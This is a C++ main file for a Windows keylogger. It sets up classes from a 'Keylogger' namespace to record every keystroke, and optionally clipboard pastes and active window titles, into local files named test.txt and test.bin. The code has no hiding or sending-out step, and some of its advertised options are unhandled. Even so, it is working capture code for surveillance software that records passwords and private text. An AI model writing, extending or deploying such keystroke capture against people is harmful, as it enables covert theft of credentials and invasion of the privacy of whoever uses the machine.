#include "ClipboardHandlerWindows.h"
#include "FileLogger.h"
#include "KeycodeMapperUS.h"
#include "KeystrokeCapturerWindows.h"
#include "WindowHandlerWindows.h"

#include "getopt.h"

#include <iostream>
#include <windows.h>

int main(int argc, char *argv[]) {
    const char* const short_opts = "chkm:o:s::w";
    const option long_opts[] = {
        {"clipboard", no_argument, nullptr, 'c'},
        {"help", no_argument, nullptr, 'h'},
        {"keycodes", no_argument, nullptr, 'k'},
        {"mapper", required_argument, nullptr, 'm'},
        {"output", required_argument, nullptr, 'o'},
        {"sandbox", optional_argument, nullptr, 's'},
        {"window", no_argument, nullptr, 'w'},
        {nullptr, no_argument, nullptr, 0}
    };

    const char help[] = "\
options:\n\
  -c, --clipboard        enable clipboard paste logging\n\
  -h, --help             shows this help menu\n\
  -k, --keycodes         log keycodes pressed/released\n\
  -m, --mapper [name]    use this keycode mapper (default US)\n\
  -o, --output [file]    output to this file\n\
  -s, --sandbox [seq]    capture key presses without passing them through\n\
  -w, --window           enable window name logging\n\
";

    bool clipboardEnable = false;
    bool keycodesLog = false;
    bool windowEnable = false;

    int opt;
    while ((opt = getopt_long(argc, argv, short_opts, long_opts, nullptr)) != -1) {
        switch (opt) {
        case 'c':
            clipboardEnable = true;
            break;
        case 'k':
            keycodesLog = true;
            break;
        case 'w':
            windowEnable = true;
            break;
        case 'h':
        case '?':
        default:
            std::cout << help;
            return 1;
        }
    }

    Keylogger::KeycodeMapperUS mapper;
    Keylogger::ClipboardHandlerWindows clipboard;
    Keylogger::WindowHandlerWindows window;

    Keylogger::FileLogger loggerBin;
    Keylogger::FileLogger logger;

    Keylogger::KeystrokeCapturerWindows capturer;

    if (keycodesLog) {
        loggerBin.open(
            nullptr,
            clipboardEnable ? &clipboard : nullptr,
            windowEnable ? &window : nullptr,
            "test.bin"
        );
        capturer.addLogger(&loggerBin);
    }

    logger.open(
        &mapper,
        clipboardEnable ? &clipboard : nullptr,
        windowEnable ? &window : nullptr,
        "test.txt"
    );
    capturer.addLogger(&logger);

    capturer.start();
    capturer.consumeKeystrokes(false);

    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    capturer.stop();
    return 0;
}